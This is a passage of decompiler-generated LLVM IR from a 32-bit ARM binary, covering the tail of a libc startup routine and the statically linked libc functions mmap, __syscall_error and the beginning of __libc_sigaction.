  %v2_1460c = call i32 @__check_one_fd(i32 2, i32 %v0_14604)
  store i32 %v2_1460c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14610

dec_label_pc_14610:                               ; preds = %dec_label_pc_145d8, %dec_label_pc_145c0, %dec_label_pc_145e8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_14618 = load i32, i32* %arg3, align 4
  store i32 %v2_14618, i32* %r2.global-to-local, align 4
  %v2_1461c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1461c, i32* %r1.global-to-local, align 4
  %v3_14620 = add i32 %v2_1461c, 260
  %v4_14620 = inttoptr i32 %v3_14620 to i32*
  store i32 %v2_14618, i32* %v4_14620, align 4
  %v0_14624 = load i32, i32* %r0.global-to-local, align 4
  %v1_14624 = inttoptr i32 %v0_14624 to i32*
  %v2_14624 = load i32, i32* %v1_14624, align 4
  store i32 %v2_14624, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14628 = icmp eq i32 %v2_14624, 0
  store i1 %v2_14628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14628, label %bb84, label %dec_label_pc_14630

dec_label_pc_14630:                               ; preds = %dec_label_pc_14610
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_14634 = load i32, i32* %r1.global-to-local, align 4
  %v2_14634 = add i32 %v0_14634, 164
  %v3_14634 = inttoptr i32 %v2_14634 to i32*
  %v4_14634 = load i32, i32* %v3_14634, align 4
  store i32 %v4_14634, i32* %r3.global-to-local, align 4
  %v2_14638 = inttoptr i32 %v4_14634 to i32*
  store i32 %v2_14624, i32* %v2_14638, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_14640 = load i32, i32* %r0.global-to-local, align 4
  %v1_14640 = inttoptr i32 %v0_14640 to i32*
  %v2_14640 = load i32, i32* %v1_14640, align 4
  store i32 %v2_14640, i32* %r0.global-to-local, align 4
  %v4_14644 = call i32 @__GI_strrchr(i32 %v2_14640, i32 47, i32 %v2_14618, i32 %v4_14634)
  store i32 %v4_14644, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_1464c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1464c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14650 = icmp eq i32 %v4_14644, 0
  store i1 %v2_14650, i1* %cpsr_z.global-to-local, align 1
  %v2_14654 = add i32 %v2_1464c, 96
  %v3_14654 = inttoptr i32 %v2_14654 to i32*
  %v4_14654 = load i32, i32* %v3_14654, align 4
  store i32 %v4_14654, i32* %r2.global-to-local, align 4
  br i1 %v2_14650, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_14630
  %v2_1465c58 = inttoptr i32 %v4_14654 to i32*
  store i32 0, i32* %v2_1465c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_14630
  %v2_14658 = add i32 %v4_14644, 1
  store i32 %v2_14658, i32* %r3.global-to-local, align 4
  %v2_1465c = inttoptr i32 %v4_14654 to i32*
  store i32 %v4_14644, i32* %v2_1465c, align 4
  %v1_14660 = load i32, i32* %r3.global-to-local, align 4
  %v2_14660 = load i32, i32* %r2.global-to-local, align 4
  %v3_14660 = inttoptr i32 %v2_14660 to i32*
  store i32 %v1_14660, i32* %v3_14660, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_14610
  %v2_14670 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14670, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1467c = add i32 %v2_14670, -12
  store i32 %v2_1467c, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1468c = add i32 %v2_14670, 2004
  %v4_1468c = inttoptr i32 %v3_1468c to i32*
  store i32 %arg5, i32* %v4_1468c, align 4
  %v0_146a418 = load i32, i32* %r4.global-to-local, align 4
  %v1_146a419 = load i32, i32* %r7.global-to-local, align 4
  %v3_146a421 = icmp uge i32 %v0_146a418, %v1_146a419
  store i1 %v3_146a421, i1* %cpsr_c.global-to-local, align 1
  %v9_146a427 = icmp eq i32 %v0_146a418, %v1_146a419
  store i1 %v9_146a427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_146a421, label %dec_label_pc_146d8.lr.ph, label %dec_label_pc_14694

dec_label_pc_14694:                               ; preds = %bb84, %dec_label_pc_14694
  %v1_14694 = phi i32 [ %v1_146a0, %dec_label_pc_14694 ], [ %v0_146a418, %bb84 ]
  %v0_14694 = load i32, i32* %r5.global-to-local, align 4
  %v2_14694 = and i32 %v1_14694, 1073741824
  %v3_14694 = icmp ne i32 %v2_14694, 0
  store i1 %v3_14694, i1* %cpsr_c.global-to-local, align 1
  %v4_14694 = mul i32 %v1_14694, 4
  %v5_14694 = add i32 %v4_14694, %v0_14694
  %v6_14694 = inttoptr i32 %v5_14694 to i32*
  %v7_14694 = load i32, i32* %v6_14694, align 4
  store i32 %v7_14694, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14694)
  %v0_146a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_146a0 = add i32 %v0_146a0, 1
  store i32 %v1_146a0, i32* %r4.global-to-local, align 4
  %v1_146a4 = load i32, i32* %r7.global-to-local, align 4
  %v3_146a4 = icmp uge i32 %v1_146a0, %v1_146a4
  store i1 %v3_146a4, i1* %cpsr_c.global-to-local, align 1
  %v9_146a4 = icmp eq i32 %v1_146a0, %v1_146a4
  store i1 %v9_146a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_146a4, label %dec_label_pc_146d8.lr.ph, label %dec_label_pc_14694

dec_label_pc_146d8.lr.ph:                         ; preds = %dec_label_pc_14694, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146ac = icmp eq i32 %v0_144f8, 0
  store i1 %v2_146ac, i1* %cpsr_z.global-to-local, align 1
  %v2_146b4 = xor i1 %v2_146ac, true
  call void @__pseudo_cond_branch(i1 %v2_146b4, i32 %v0_144f8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_146c0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_146cc = add i32 %v2_146c0, -12
  store i32 %v2_146cc, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_146d8

dec_label_pc_146d8:                               ; preds = %dec_label_pc_146d8.dec_label_pc_146d8_crit_edge, %dec_label_pc_146d8.lr.ph
  %v1_146d8 = phi i32 [ %v1_146e4, %dec_label_pc_146d8.dec_label_pc_146d8_crit_edge ], [ 0, %dec_label_pc_146d8.lr.ph ]
  %v0_146d8 = phi i32 [ %v0_146d8.pre, %dec_label_pc_146d8.dec_label_pc_146d8_crit_edge ], [ %v2_146cc, %dec_label_pc_146d8.lr.ph ]
  %v2_146d8 = and i32 %v1_146d8, 1073741824
  %v3_146d8 = icmp ne i32 %v2_146d8, 0
  store i1 %v3_146d8, i1* %cpsr_c.global-to-local, align 1
  %v4_146d8 = mul i32 %v1_146d8, 4
  %v5_146d8 = add i32 %v4_146d8, %v0_146d8
  %v6_146d8 = inttoptr i32 %v5_146d8 to i32*
  %v7_146d8 = load i32, i32* %v6_146d8, align 4
  store i32 %v7_146d8, i32* %ip.global-to-local, align 4
  store i32 83684, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_146d8)
  %v0_146e4 = load i32, i32* @r4, align 4
  %v1_146e4 = add i32 %v0_146e4, 1
  store i32 %v1_146e4, i32* @r4, align 4
  %v1_146e8 = load i32, i32* @r7, align 4
  %v3_146e8 = icmp uge i32 %v1_146e4, %v1_146e8
  store i1 %v3_146e8, i1* %cpsr_c.global-to-local, align 1
  %v9_146e8 = icmp eq i32 %v1_146e4, %v1_146e8
  store i1 %v9_146e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_146e8, label %dec_label_pc_146f0, label %dec_label_pc_146d8.dec_label_pc_146d8_crit_edge

dec_label_pc_146d8.dec_label_pc_146d8_crit_edge:  ; preds = %dec_label_pc_146d8
  %v0_146d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_146d8

dec_label_pc_146f0:                               ; preds = %dec_label_pc_146d8
  %v2_146f4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_146f4.pre, i32* %r0.global-to-local, align 4
  %v2_146f8 = add i32 %v2_146f4.pre, -66868
  store i32 %v2_146f8, i32* %r2.global-to-local, align 4
  store i32 %v2_146f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14700 = icmp eq i32 %v2_146f8, 0
  store i1 %v2_14700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14700, label %dec_label_pc_14718, label %dec_label_pc_14708

dec_label_pc_14708:                               ; preds = %dec_label_pc_146f0
  store i32 83728, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_146f8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14714 = load i32, i32* %r0.global-to-local, align 4
  %v2_14714 = inttoptr i32 %v1_14714 to i32*
  store i32 0, i32* %v2_14714, align 4
  %v2_1471c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_14718

dec_label_pc_14718:                               ; preds = %dec_label_pc_146f0, %dec_label_pc_14708
  %v2_1471c = phi i32 [ %v2_146f4.pre, %dec_label_pc_146f0 ], [ %v2_1471c.pre, %dec_label_pc_14708 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_1471c, i32* %r1.global-to-local, align 4
  %v2_14720 = add i32 %v2_1471c, 128
  %v3_14720 = inttoptr i32 %v2_14720 to i32*
  %v4_14720 = load i32, i32* %v3_14720, align 4
  store i32 %v4_14720, i32* %r2.global-to-local, align 4
  store i32 %v4_14720, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14728 = icmp eq i32 %v4_14720, 0
  store i1 %v2_14728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14728, label %dec_label_pc_14740, label %dec_label_pc_14730

dec_label_pc_14730:                               ; preds = %dec_label_pc_14718
  store i32 83768, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14720)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1473c = load i32, i32* %r0.global-to-local, align 4
  %v2_1473c = inttoptr i32 %v1_1473c to i32*
  store i32 0, i32* %v2_1473c, align 4
  br label %dec_label_pc_14740

dec_label_pc_14740:                               ; preds = %dec_label_pc_14718, %dec_label_pc_14730
  %v2_14740 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_14740, i32* @r0, align 4
  %v1_14744 = call i32 @_setjmp(i32 %v2_14740)
  store i32 %v1_14744, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14748 = icmp eq i32 %v1_14744, 0
  store i1 %v2_14748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14748, label %dec_label_pc_14750, label %dec_label_pc_1479c

dec_label_pc_14750:                               ; preds = %dec_label_pc_14740
  %v0_14750 = call i32 @__aeabi_read_tp()
  store i32 %v0_14750, i32* %r0.global-to-local, align 4
  %v1_14754 = add i32 %v0_14750, -1168
  store i32 %v1_14754, i32* %r2.global-to-local, align 4
  %v2_1475c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1475c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_14768 = add i32 %v2_1475c, 56
  %v3_14768 = inttoptr i32 %v2_14768 to i32*
  %v4_14768 = load i32, i32* %v3_14768, align 4
  store i32 %v4_14768, i32* %ip.global-to-local, align 4
  store i32 %v2_14740, i32* %r3.global-to-local, align 4
  %v2_14778 = add i32 %v0_14750, -1040
  %v3_14778 = inttoptr i32 %v2_14778 to i32*
  store i32 %v2_14740, i32* %v3_14778, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_14784 = load i32, i32* %ip.global-to-local, align 4
  %v1_14784 = inttoptr i32 %v0_14784 to i32*
  %v2_14784 = load i32, i32* %v1_14784, align 4
  store i32 %v2_14784, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_14794 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14838

dec_label_pc_1479c:                               ; preds = %dec_label_pc_14740
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_147a0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_147a0, i32* %ip.global-to-local, align 4
  %v2_147a4 = add i32 %v2_147a0, 40
  %v3_147a4 = inttoptr i32 %v2_147a4 to i32*
  %v4_147a4 = load i32, i32* %v3_147a4, align 4
  store i32 %v4_147a4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_147a4)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_147b4 = load i32, i32* %stack_var_-416, align 4
  %v2_147b8 = add i32 %v2_147b4, 120
  %v3_147b8 = inttoptr i32 %v2_147b8 to i32*
  %v4_147b8 = load i32, i32* %v3_147b8, align 4
  store i32 %v4_147b8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_147bc

dec_label_pc_147bc:                               ; preds = %dec_label_pc_147f0.dec_label_pc_147bc_crit_edge, %dec_label_pc_1479c
  %v0_147bc = phi i32 [ %v0_147bc.pre, %dec_label_pc_147f0.dec_label_pc_147bc_crit_edge ], [ %v4_147b8, %dec_label_pc_1479c ]
  %v1_147bc = inttoptr i32 %v0_147bc to i32*
  %v2_147bc = load i32, i32* %v1_147bc, align 4
  store i32 %v0_147bc, i32* %r2.global-to-local, align 4
  store i32 %v2_147bc, i32* %r4.global-to-local, align 4
  %v1_147c8 = add i32 %v2_147bc, -1
  store i32 %v1_147c8, i32* %r1.global-to-local, align 4
  %v2_147cc89 = load i32, i32* %v1_147bc, align 4
  store i32 %v2_147cc89, i32* %r3.global-to-local, align 4
  %v3_147d091 = icmp uge i32 %v2_147cc89, %v2_147bc
  store i1 %v3_147d091, i1* %cpsr_c.global-to-local, align 1
  %v9_147d097 = icmp eq i32 %v2_147cc89, %v2_147bc
  store i1 %v9_147d097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_147d097, label %dec_label_pc_147d8, label %dec_label_pc_147f0

dec_label_pc_147d8:                               ; preds = %dec_label_pc_147bc, %dec_label_pc_147d8.dec_label_pc_147cc_crit_edge
  %v0_147d898 = phi i32 [ %v1_147d0.pre, %dec_label_pc_147d8.dec_label_pc_147cc_crit_edge ], [ %v2_147bc, %dec_label_pc_147bc ]
  store i32 %v0_147d898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_147e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_147e8, label %dec_label_pc_147ec, label %dec_label_pc_147d8.dec_label_pc_147cc_crit_edge

dec_label_pc_147d8.dec_label_pc_147cc_crit_edge:  ; preds = %dec_label_pc_147d8
  %v0_147cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_147d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_147cc = inttoptr i32 %v0_147cc.pre to i32*
  %v2_147cc = load i32, i32* %v1_147cc, align 4
  store i32 %v2_147cc, i32* %r3.global-to-local, align 4
  %v3_147d0 = icmp uge i32 %v2_147cc, %v1_147d0.pre
  store i1 %v3_147d0, i1* %cpsr_c.global-to-local, align 1
  %v9_147d0 = icmp eq i32 %v2_147cc, %v1_147d0.pre
  store i1 %v9_147d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_147d0, label %dec_label_pc_147d8, label %dec_label_pc_147f0

dec_label_pc_147ec:                               ; preds = %dec_label_pc_147d8
  %v0_147ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_147ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_147f0

dec_label_pc_147f0:                               ; preds = %dec_label_pc_147bc, %dec_label_pc_147d8.dec_label_pc_147cc_crit_edge, %dec_label_pc_147ec
  %v0_147f8 = phi i32 [ %v0_147ec, %dec_label_pc_147ec ], [ %v2_147cc89, %dec_label_pc_147bc ], [ %v2_147cc, %dec_label_pc_147d8.dec_label_pc_147cc_crit_edge ]
  %v1_147f0 = phi i32 [ %v0_147ec, %dec_label_pc_147ec ], [ %v2_147bc, %dec_label_pc_147bc ], [ %v1_147d0.pre, %dec_label_pc_147d8.dec_label_pc_147cc_crit_edge ]
  %v3_147f0 = icmp uge i32 %v0_147f8, %v1_147f0
  store i1 %v3_147f0, i1* %cpsr_c.global-to-local, align 1
  %v9_147f0 = icmp eq i32 %v0_147f8, %v1_147f0
  store i1 %v9_147f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_147f0, label %dec_label_pc_147f8, label %dec_label_pc_147f0.dec_label_pc_147bc_crit_edge

dec_label_pc_147f0.dec_label_pc_147bc_crit_edge:  ; preds = %dec_label_pc_147f0
  %v0_147bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_147bc

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147f0
  %v2_147f8 = icmp ne i32 %v1_147f0, 0
  store i1 %v2_147f8, i1* %cpsr_c.global-to-local, align 1
  %v7_147f8 = icmp eq i32 %v1_147f0, 1
  store i1 %v7_147f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_147f8, label %dec_label_pc_14838, label %dec_label_pc_14800

dec_label_pc_14800:                               ; preds = %dec_label_pc_147f8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14838

dec_label_pc_14838:                               ; preds = %dec_label_pc_147f8, %dec_label_pc_14800, %dec_label_pc_14750
  %storemerge2 = phi i32 [ %v0_14794, %dec_label_pc_14750 ], [ 0, %dec_label_pc_14800 ], [ 0, %dec_label_pc_147f8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_1483c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_1483c, i32* %r0.global-to-local, align 4
  %v0_14840 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14840, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_14838
  %v4_14840 = load i32, i32* %r4.global-to-local, align 4
  %v9_14840 = sub i32 %v1_1483c, %v4_14840
  %v2_14844 = load i32, i32* @r8, align 4
  %v8_14844 = shl i32 %v2_14844, %v9_14840
  %v9_14844 = and i32 %v8_14844, %v9_14840
  %v8_14848 = lshr i32 %v2_14844, %v9_14844
  %v9_14848 = and i32 %v8_14848, %v9_14844
  %v2_1484c = inttoptr i32 %v9_14848 to i64*
  %v3_1484c = load i64, i64* %v2_1484c, align 4
  %v5_1484c = trunc i64 %v3_1484c to i32
  %v6_1484c = udiv i64 %v3_1484c, 4294967296
  %v7_1484c = trunc i64 %v6_1484c to i32
  store i32 %v5_1484c, i32* %r1.global-to-local, align 4
  %v9_1484c = sub i32 %v7_1484c, %v2_14844
  %v3_14850 = mul i32 %v9_1484c, %v4_14840
  %v5_14858 = mul i32 %v4_14840, 4
  %v5_1485c = udiv i32 %v4_14840, 2
  %v6_14858 = and i32 %v5_1485c, %v5_14858
  %v6_1485c = and i32 %v6_14858, %v3_14850
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1485c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_14838, %bb85
  %v5_14860 = phi i32 [ %v1_1483c, %dec_label_pc_14838 ], [ %v6_1485c, %bb85 ]
  ret i32 %v5_14860

; uselistorder directives
  uselistorder i32 %v4_14840, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_147f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_147ec, { 1, 0, 2 }
  uselistorder i32 %v1_147d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_147bc, { 1, 0 }
  uselistorder i32 %v2_1471c, { 1, 0 }
  uselistorder i32 %v2_146f4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_146e8, { 1, 0 }
  uselistorder i32 %v1_146e4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_146d8, { 1, 0 }
  uselistorder i32 %v1_146a4, { 1, 0 }
  uselistorder i32 %v1_146a0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14694, { 1, 0 }
  uselistorder i32 %v2_14670, { 1, 0, 2 }
  uselistorder i32 %v4_14654, { 1, 0, 2 }
  uselistorder i32 %v4_14644, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1458c, { 1, 2, 0 }
  uselistorder i32 %v2_14558, { 1, 2, 0 }
  uselistorder i32 %v1_14554, { 1, 2, 0 }
  uselistorder i1 %v2_14540, { 1, 0, 2 }
  uselistorder i32 %v5_14544, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14510, { 1, 0, 2, 3 }
  uselistorder i32 %v0_144f8, { 1, 0, 2 }
  uselistorder i32 %v2_144ec, { 1, 0, 2 }
  uselistorder i32 %v3_144bc, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 2, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 1, 3, 4, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 2, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 1, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 1, 10, 11, 12, 14, 13, 2, 15, 17, 16, 3, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 0, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 6, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_14838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_147f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147d8, { 1, 0 }
  uselistorder label %dec_label_pc_14740, { 1, 0 }
  uselistorder label %dec_label_pc_14718, { 1, 0 }
  uselistorder label %dec_label_pc_14694, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14610, { 2, 0, 1 }
  uselistorder label %dec_label_pc_145e8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_14558, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_14540, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1488c = load i32, i32* @r4, align 4
  store i32 %v3_1488c, i32* %stack_var_-16, align 4
  %v3_14898 = urem i32 %arg3, 4096
  %v2_1489c = icmp eq i32 %v3_14898, 0
  br i1 %v2_1489c, label %dec_label_pc_148c0, label %dec_label_pc_148a4

dec_label_pc_148a4:                               ; preds = %entry
  %v0_148a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_148a8, i32* %r0.global-to-local, align 4
  %v3_148ac = load i16, i16* @global_var_216ec.303, align 2
  %v4_148ac = sext i16 %v3_148ac to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_148b8 = add i32 %v4_148ac, %v0_148a8
  %v4_148b8 = inttoptr i32 %v3_148b8 to i32*
  store i32 22, i32* %v4_148b8, align 4
  %v0_148f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_148f4

dec_label_pc_148c0:                               ; preds = %entry
  %v0_148d0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_148d0, -4095
  br i1 %tmp, label %dec_label_pc_148f0, label %dec_label_pc_148d8

dec_label_pc_148d8:                               ; preds = %dec_label_pc_148c0
  %v1_148dc = sub i32 0, %v0_148d0
  %v3_148e0 = load i16, i16* @global_var_216ec.303, align 2
  %v4_148e0 = sext i16 %v3_148e0 to i32
  %v0_148e4 = call i32 @__aeabi_read_tp()
  %v3_148e8 = add i32 %v4_148e0, %v0_148e4
  %v4_148e8 = inttoptr i32 %v3_148e8 to i32*
  store i32 %v1_148dc, i32* %v4_148e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148f0

dec_label_pc_148f0:                               ; preds = %dec_label_pc_148c0, %dec_label_pc_148d8
  %v0_148f0 = phi i32 [ %v0_148d0, %dec_label_pc_148c0 ], [ -1, %dec_label_pc_148d8 ]
  store i32 %v0_148f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_148f4

dec_label_pc_148f4:                               ; preds = %dec_label_pc_148a4, %dec_label_pc_148f0
  %v0_148f4 = phi i32 [ %v0_148f4.pre, %dec_label_pc_148a4 ], [ %v0_148f0, %dec_label_pc_148f0 ]
  store i32 %v0_148f4, i32* %r0.global-to-local, align 4
  %v2_148f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_148f8, i32* @r4, align 4
  ret i32 %v0_148f4

; uselistorder directives
  uselistorder i32 %v0_148f4, { 1, 0 }
  uselistorder i32 %v0_148d0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_148f4, { 1, 0 }
  uselistorder label %dec_label_pc_148f0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_14908 = load i32, i32* @lr, align 4
  store i32 %v0_14908, i32* %stack_var_-4, align 4
  %v0_14910 = load i32, i32* @r0, align 4
  %v3_14914 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14914 = sext i16 %v3_14914 to i32
  store i32 %v4_14914, i32* @r2, align 4
  %v0_14918 = call i32 @__aeabi_read_tp()
  %v1_1491c = sub i32 0, %v0_14910
  store i32 %v1_1491c, i32* @r3, align 4
  %v2_14920 = load i32, i32* @r2, align 4
  %v3_14920 = add i32 %v2_14920, %v0_14918
  %v4_14920 = inttoptr i32 %v3_14920 to i32*
  store i32 %v1_1491c, i32* %v4_14920, align 4
  %v2_14928 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_14928, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14934 = load i32, i32* @r4, align 4
  %v6_14934 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1493c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1493c, label %dec_label_pc_14990, label %dec_label_pc_14954

dec_label_pc_14954:                               ; preds = %entry
  %v1_14954 = add i32 %arg2, 4
